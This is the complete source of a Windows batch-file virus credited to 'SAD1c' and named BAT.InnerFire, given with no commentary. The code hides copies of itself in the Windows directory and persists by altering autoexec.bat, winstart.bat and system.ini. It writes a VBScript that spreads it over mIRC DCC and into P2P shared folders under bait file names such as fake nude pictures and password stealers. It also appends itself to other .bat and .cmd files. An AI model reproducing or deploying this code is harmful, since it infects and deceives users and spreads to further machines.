:: BAT.InnerFire - By SAD1c
@echo off%InnerFire%
ver|find "XP">nul%InnerFire%
if errorlevel 1 ctty nul%InnerFire%
if %1==BatI goto InnerFireBatI
if InnerFire%windir%==InnerFire set windir=%systemroot%%InnerFire%
if exist %windir%\WinLoad.bat attrib -r -s -h %windir%\WinLoad.bat%InnerFire%
echo.>%windir%\WinLoad.bat
find "InnerFire"<%0>>%windir%\WinLoad.bat
if exist %windir%\ÕßÌ±ËþÍÕ\WService.bat goto InnerFireDone
md %windir%\ÕßÌ±ËþÍÕ%InnerFire%
attrib +s +h %windir%\ÕßÌ±ËþÍÕ%InnerFire%
copy %windir%\WinLoad.bat %windir%\ÕßÌ±ËþÍÕ\WService.bat%InnerFire%
attrib -r c:\autoexec.bat%InnerFire%
echo @call %windir%\ÕßÌ±ËþÍÕ\WService.bat>>c:\autoexec.bat%InnerFire%
attrib -r %windir%\winstart.bat%InnerFire%
echo @call %windir%\ÕßÌ±ËþÍÕ\WService.bat>>%windir%\winstart.bat%InnerFire%
:InnerFireDone
find /v /i "[boot]"<%windir%\system.ini>%tmp%\temp1.tmp%InnerFire%
find /v /i "shell=explorer.exe"<%tmp%\temp1.tmp>%tmp%\temp2.tmp%InnerFire%
echo [boot]>%windir%\system.ini%InnerFire%
echo Shell=Explorer.exe WinLoad.bat>>%windir%\system.ini%InnerFire%
type %tmp%\temp2.tmp>>%windir%\system.ini%InnerFire%
echo.on error resume next>%tmp%\WLtemp.vbs%InnerFire%
echo set fsys=wscript.createobject("scripting.filesystemobject")>>%tmp%\WLtemp.vbs%InnerFire%
echo set wshl=wscript.createobject("wscript.shell")>>%tmp%\WLtemp.vbs%InnerFire%
echo set pdir=fsys.getfolder(wshl.specialfolders("programs"))>>%tmp%\WLtemp.vbs%InnerFire%
echo for each folder in pdir.subfolders>>%tmp%\WLtemp.vbs%InnerFire%
echo fname=lcase(folder.name)>>%tmp%\WLtemp.vbs%InnerFire%
echo if fname="mirc" or fname="mirc32" then>>%tmp%\WLtemp.vbs%InnerFire%
echo fsys.copyfile "%windir%\MSexplore.bat",folder.path&"\mIRC_Utilities.bat>>%tmp%\WLtemp.vbs%InnerFire%
echo set mfile=fsys.createtextfile(folder.path&"\Script.ini",1)>>%tmp%\WLtemp.vbs%InnerFire%
echo mfile.writeline "[Script]">>%tmp%\WLtemp.vbs%InnerFire%
echo mfile.writeline "n0=on 1:join:#:{">>%tmp%\WLtemp.vbs%InnerFire%
echo mfile.writeline "n1= /if ($nick==$me) {halt}">>%tmp%\WLtemp.vbs%InnerFire%
echo mfile.writeline "n2= /msg $nick Hi! Try this useful program!">>%tmp%\WLtemp.vbs%InnerFire%
%InnerFire%set crypt=send
echo mfile.writeline "n3= /dcc %crypt% $nick "&folder.path&"\mIRC_Utilities.bat }">>%tmp%\WLtemp.vbs%InnerFire%
echo mfile.close>>%tmp%\WLtemp.vbs%InnerFire%
echo elseif fname="morpheus" or fname="kmd" or fname="kazaa" or fname="kazaa lite" then>>%tmp%\WLtemp.vbs%InnerFire%
echo P2PALL(folder.path&"\My Shared Folder")>>%tmp%\WLtemp.vbs%InnerFire%
echo elseif fname="edonkey2000" or fname="emule" or fname="overnet" or fname="applejuice" then>>%tmp%\WLtemp.vbs%InnerFire%
echo P2PALL(folder.path&"\Incoming")>>%tmp%\WLtemp.vbs%InnerFire%
echo elseif fname="bearshare" or fname="limewire" then>>%tmp%\WLtemp.vbs%InnerFire%
echo P2PALL(folder.path&"\Shared")>>%tmp%\WLtemp.vbs%InnerFire%
echo elseif fname="grokster" then>>%tmp%\WLtemp.vbs%InnerFire%
echo P2PALL(folder.path&"\My Grokster")>>%tmp%\WLtemp.vbs%InnerFire%
echo end if>>%tmp%\WLtemp.vbs%InnerFire%
echo next>>%tmp%\WLtemp.vbs%InnerFire%
echo sub P2PALL(dir)>>%tmp%\WLtemp.vbs%InnerFire%
echo.on error resume next>>%tmp%\WLtemp.vbs%InnerFire%
echo set virus=fsys.getfile("%windir%\WinLoad.bat")>>%tmp%\WLtemp.vbs%InnerFire%
echo virus.copy dir&"\Hacking Websites.txt.bat">>%tmp%\WLtemp.vbs%InnerFire%
echo virus.copy dir&"\Hardcore Sex Pics.zip.bat">>%tmp%\WLtemp.vbs%InnerFire%
echo virus.copy dir&"\Hot Teens Pics.zip.bat">>%tmp%\WLtemp.vbs%InnerFire%
echo virus.copy dir&"\AIM password stealer.exe.bat">>%tmp%\WLtemp.vbs%InnerFire%
echo virus.copy dir&"\Guide on API hooking.txt.bat">>%tmp%\WLtemp.vbs%InnerFire%
echo virus.copy dir&"\Christina Aguilera naked.zip.bat">>%tmp%\WLtemp.vbs%InnerFire%
echo virus.copy dir&"\Saddam Alive-pics.zip.bat">>%tmp%\WLtemp.vbs%InnerFire%
echo virus.copy dir&"\Bin Laden-new pics.zip.bat">>%tmp%\WLtemp.vbs%InnerFire%
echo virus.copy dir&"\Howto steal Hotmail passwords.txt.bat">>%tmp%\WLtemp.vbs%InnerFire%
echo end sub>>%tmp%\WLtemp.vbs%InnerFire%
cscript %tmp%\WLtemp.vbs>nul%InnerFire%
rem|for %%W in (*.bat ..\*.bat \*.bat %path%\*.bat) do attrib -r %%W%InnerFire%
rem|for %%W in (*.bat ..\*.bat \*.bat %path%\*.bat) do call %0 BatI %%W%InnerFire%
rem|for %%L in (*.cmd ..\*.cmd \*.cmd %path%\*.cmd) do attrib -r %%L%InnerFire%
rem|for %%L in (*.cmd ..\*.cmd \*.cmd %path%\*.cmd) do call %0 BatI %%L%InnerFire%
goto InnerFireBatEnd
:InnerFireBatI
echo.|type %2|find "InnerFire">nul
if errorlevel 1 copy %2+%windir%\WinLoad.bat %2 /y /b%InnerFire%
goto InnerFireEnd
:InnerFireBatEnd
attrib +r +s +h %windir%\WinLoad.bat%InnerFire%
del %tmp%\*.tmp%InnerFire%
del %tmp%\*.vbs%InnerFire%
ver|find "XP">nul%InnerFire%
if errorlevel 1 ctty con%InnerFire%
:InnerFireEnd
cls%InnerFire%